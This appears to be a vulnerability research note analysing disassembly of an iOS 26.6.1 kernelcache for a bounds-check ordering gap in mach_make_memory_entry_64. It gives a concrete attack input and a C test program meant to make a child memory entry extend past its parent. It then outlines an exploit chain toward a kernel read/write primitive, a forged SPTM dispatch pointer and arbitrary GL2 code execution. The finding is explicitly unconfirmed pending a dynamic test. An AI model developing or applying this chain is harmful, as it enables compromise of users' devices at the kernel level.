# mach_make_memory_entry_64: Surface 4 Parent Bounds Check Ordering

*Generated 2026-10-25 | iOS 26.6.1 target | Static analysis of kc_26.6.1.macho*

---

## Finding: DANGEROUS STRUCTURE CONFIRMED

All parent bounds checks use ORIGINAL child size. vm_sanitize correction happens AFTER.
Post-BL checks use different register state and do NOT re-verify child_offset+corrected_size.

---

## Key Instruction Sequence

### Pre-BL (all use original child size)

```
0x379fddc: LDR x8, [x1, #0x0]     ; x8 = *size (original, from caller pointer)

...

0x37a00a8: ADDS x8, x2, x8         ; x2=child_offset + x8=original_size → overflow check
0x37a00ac: B.CS 0x379ff98           ; overflow → error
0x37a00d0: SUBS x19, x9, x20       ; parent_bound - child_something → available_range
0x37a00d4: B.LS 0x379ff9c           ; ≤ 0 → error
0x37a00d8: CMP x2, x9               ; child_offset vs parent_bound
0x37a00e4: B.HI 0x379ff9c           ; offset > bound → error
```
All three checks fire BEFORE the vm_sanitize BL. No correction yet. x8 = original size throughout.

### The vm_sanitize BL

```
0x37a0100: MOV x2, x19             ; x2 overwritten ← parent_entry pointer (arg2)
0x37a0104: MOVZ w3, #4             ; w3 = API id (mach_make_memory_entry)
0x37a0108: BL  0x378f748           ; ← vm_sanitize corrects child size here
0x37a010c: CBZ w0, 0x37a0228       ; KERN_SUCCESS → success path
0x37a0118: B   0x37a0920           ; non-zero → return error
```

Key: MOV x2, x19 at 0x37a0100 overwrites x2 (child offset) BEFORE the BL.
After the BL, x2 no longer holds child_offset.

### Post-BL checks (NOT a re-verification of child bounds)

```
0x37a0158: LDR x9, [x19, #0x28]   ; x9 = field from parent entry struct
0x37a015c: ADDS x2, x2, x9         ; x2=parent_ptr + struct_field (NOT child_offset+corrected_size)
0x37a0160: B.CC 0x37a01fc           ; no overflow → continue
0x37a0204: ADDS x10, x2, x10       ; further internal check
0x37a0208: B.CS 0x37a0164           ; overflow → error
0x37a021c: CMP  x10, x11
0x37a0220: B.HI 0x37a03a8           ; upper bound check
```

x2 at 0x37a015c is parent_entry pointer (set at 0x37a0100), NOT original child offset.
These post-BL checks do NOT verify child_offset + corrected_size ≤ parent_end.

---

## Concrete Attack Input

```
parent covers [A, A+0x2000)
child request: offset = A+0x0FFE, size = 0x1001

Pre-BL checks (all pass):
  ADDS: (A+0x0FFE) + 0x1001 = A+0x1FFF → no carry → passes
  CMP child_offset vs parent_bound: A+0x0FFE < A+0x2000 → passes

vm_sanitize corrects: 0x1001 → 0x2000  (rounds up to page alignment)

Entry created with corrected size:
  child = [A+0x0FFE, A+0x2FFE)
  escapes parent by 0xFFE bytes

Max escape per call = PAGE_SIZE - 1 = 0xFFF bytes
```

---

## Surface 4 Status: STRUCTURALLY PLAUSIBLE — Requires Dynamic Test

Static confirmation:
  ✓ All parent bounds checks use original size (before correction)
  ✓ vm_sanitize correction happens after all bounds checks
  ✓ Post-BL checks use overwritten registers (x2 = parent_ptr, not child_offset)
  ✓ No post-correction re-verification of child_offset + corrected_size ≤ parent_end

Unknown (needs dynamic test):
  ? Does vm_sanitize return corrected size in a way the entry creation code actually uses?
  ? Does a separate path in the success branch (0x37a0228+) re-check bounds with corrected size?

---

## Dynamic Test

On a 26.6.1 device:

```c
mach_port_t parent, child;
mach_vm_address_t addr;
mach_vm_size_t size;

// Create parent entry of 0x2000 bytes
mach_vm_allocate(mach_task_self(), &addr, 0x2000, VM_FLAGS_ANYWHERE);
mach_make_memory_entry_64(mach_task_self(),
    (memory_object_size_t*)&(size=0x2000), addr,
    VM_PROT_READ|VM_PROT_WRITE, &parent, MACH_PORT_NULL);

// Child: offset just inside parent, sub-page size that rounds up past parent end
memory_object_size_t child_size = 0x1001;
mach_make_memory_entry_64(mach_task_self(),
    &child_size,
    addr + 0x0FFE,          // offset A+0x0FFE
    VM_PROT_READ|VM_PROT_WRITE,
    &child, parent);

// If surface is live: child_size returns 0x2000 (corrected)
// and the child entry covers [addr+0x0FFE, addr+0x2FFE) — 0xFFE bytes past parent
printf("child_size returned: 0x%llx\n", child_size);
// Expected if SAFE: 0x1000 or error
// Expected if LIVE: 0x2000 with effective range escaping parent
```

---

## Full Exploit Chain (if dynamic test confirms)

```
1. mach_make_memory_entry_64 → child entry escapes parent by 0xFFE bytes
2. vm_remap child entry → physical pages beyond parent's intended range mapped
3. Kernel r/w primitive via aliased physical memory
4. Forge SPTM dispatch table pointer in kernel data
5. GENTER with controlled integer (26.6.1 integer dispatch — no named-pair enforcement)
6. Arbitrary GL2 code execution
```

---

## 26.6.1 vs 27.0.1

In 27.0.1: vm_sanitize_telemetry.c is entirely removed. The soft-landing correction is gone.
A sub-page size input to mach_make_memory_entry_64 hits a hard assertion instead of being
silently corrected. The check/use gap cannot exist because no correction is applied.

This surface is 26.6.1-specific.
